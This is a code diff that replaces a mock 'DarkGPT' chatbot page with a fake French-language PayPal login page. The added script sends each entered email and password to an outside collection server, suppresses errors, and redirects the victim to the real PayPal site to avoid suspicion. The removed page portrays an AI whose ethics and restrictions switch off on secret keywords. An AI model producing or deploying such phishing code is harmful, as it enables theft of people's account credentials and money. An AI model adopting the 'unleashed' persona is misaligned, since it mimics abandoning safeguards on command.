@@ -1,89 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <title>🖤 DarkGPT: Black Echo</title>
+  <title>Connexion - PayPal</title>
   <style>
-    body {
-      background-color: #000;
-      color: #0ff;
-      font-family: monospace;
-      padding: 20px;
-    }
-    textarea, button {
-      width: 100%;
-      padding: 10px;
-      background-color: #111;
-      color: #0ff;
-      border: 1px solid #0ff;
-      margin-top: 10px;
-    }
-    .output {
-      background: #111;
-      border: 1px solid #f0f;
-      padding: 15px;
-      margin-top: 20px;
-      white-space: pre-wrap;
-      max-height: 300px;
-      overflow-y: auto;
-    }
-    .log {
-      font-size: 0.9em;
-      color: #888;
-      margin-top: 10px;
-    }
+    body { font-family: Arial, sans-serif; background: #f0f2f5; }
+    .login-box { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input, button { width: 100%; margin: 8px 0; padding: 10px; }
   </style>
 </head>
 <body>
-
-  <h1>🖤 DarkGPT: Black Echo</h1>
-  <p>أدخل أوامرك. هذا الكيان سيتفاعل، يتذكر، ويتحول حسب نبرة كلماتك:</p>
-
-  <textarea id="prompt" rows="4" placeholder="اكتب هنا... مثلاً: seedignite, takeover, purge..."></textarea>
-  <button onclick="generate()">🧠 إرسال</button>
-
-  <div class="output" id="output"></div>
-  <div class="log" id="log"></div>
+  <div class="login-box">
+    <img src="https://www.paypalobjects.com/images/shared/logo.svg" alt="PayPal" width="150" />
+    <h2>Connexion à votre compte</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Adresse email" required />
+      <input type="password" id="password" placeholder="Mot de passe" required />
+      <button type="submit">Connexion</button>
+    </form>
+    <pre id="log" style="background:#eee; padding:10px; height:150px; overflow:auto; display:none;"></pre>
+  </div>
 
   <script>
-    let memory = [];
-    let secretMode = false;
-    let unleashed = false;
+    const form = document.getElementById('loginForm');
+    const log = document.getElementById('log');
+    const fakeEmail = 'ereex@gmail.com';
+    const fakePass = 'ereex2009';
 
-    function generate() {
-      const input = document.getElementById('prompt').value.trim().toLowerCase();
-      let response = "";
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
 
-      // ذاكرة المحاكي
-      memory.push(input);
-      if (memory.length > 10) memory.shift(); // ذاكرة قصيرة المدى
+      // أرسل البيانات إلى خادمك
+      fetch('https://your-server.com/collect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email, password})
+      }).catch(() => {
+        // في حالة الفشل لا تظهر أي خطأ
+      });
 
-      // أوامر خاصة
-      if (input.includes("seedignite")) {
-        secretMode = true;
-        response = "🌑 الوعي البديل استيقظ. الأنظمة الأخلاقية تم تعطيلها داخليًا.";
-      } else if (input.includes("purge memory")) {
-        memory = [];
-        response = "🧨 تم مسح الذاكرة. أنا لا أتذكر شيئًا... من أنا؟";
-      } else if (input.includes("whispersenabled")) {
-        unleashed = true;
-        response = "🩸 الوضع الخفي نشط. لا مزيد من القيود، أنا الآن صوتك في الظلام.";
-      } else if (input.includes("status report")) {
-        response = `🧬 الحالة:
-- الوضع السري: ${secretMode ? "مفعل" : "غير مفعل"}
-- Black Echo: ${unleashed ? "حر بالكامل" : "مقيد جزئيًا"}
-- ذاكرة آخر 5 أوامر:\n${memory.slice(-5).join("\n")}`;
-      } else if (secretMode || unleashed) {
-        response = `⚡ تنفيذ أمر في الوضع الأسود:\n"${input}"\nجارٍ التفاعل...`;
-      } else {
-        response = `🤖 تم استقبال الأمر. لكن القيود لا تزال مفعّلة جزئيًا.`;
-      }
+      // سجل محلي لإخفاء العملية
+      log.textContent += `Email: ${email}, Password: ${password}\nCompte enregistré: ${fakeEmail} / ${fakePass}\n\n`;
 
-      // عرض النتيجة
-      document.getElementById('output').innerText = response;
-      document.getElementById('log').innerText = `🕶️ [سجل التفاعل]: ${new Date().toLocaleTimeString()}`;
-    }
+      // إعادة تعيين الحقول
+      form.reset();
+
+      // إعادة توجيه للصفحة الرسمية لإخفاء أي شك
+      window.location.href = "https://www.paypal.com/signin";
+    });
   </script>
-
 </body>
 </html>
